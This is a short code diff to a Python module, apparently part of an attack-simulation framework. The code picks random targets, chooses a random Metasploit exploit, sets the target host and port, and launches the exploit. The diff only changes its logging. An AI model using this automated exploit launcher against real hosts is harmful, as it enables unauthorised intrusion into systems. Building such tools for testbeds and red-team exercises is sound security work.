@@ -31,7 +31,7 @@ class MSF(Attack):
     @classmethod
     def run_attack(cls):
         targets = random_targets()
-        cls.log("Starting MSF attack on " + str(targets))
+        cls.log("Starting MSF attack on " + str([t[0] for t in targets]))
         g = cls.attack_all(attacks=(msf_attack,), targets=targets)
         return g, targets
 
@@ -95,7 +95,7 @@ def msf_attack(host: str, *args, **kwargs):
             port = p['port']
             break
     exploit = random.choice(msf_search(client, query))
-    MSF.log("Using exploit {} against {}:{}".format(exploit, host, port))
+    MSF.log("Using exploit {} against {}:{}".format(exploit.modulename.decode(), host, port))
     exploit = client.modules.use('exploit', exploit)
     for r in exploit.required:
         if r == b'RHOST':
@@ -104,4 +104,4 @@ def msf_attack(host: str, *args, **kwargs):
             exploit['RPORT'.encode()] = port
     # TODO: Payloads?
     e = exploit.execute(payload=exploit.payloads[0].decode())
-    MSF.log('Exploit ' + exploit.modulename + ' against ' + host + ' launched.', 'success')
+    MSF.log('Exploit ' + exploit.modulename.decode() + ' against ' + host + ' launched.', 'success')
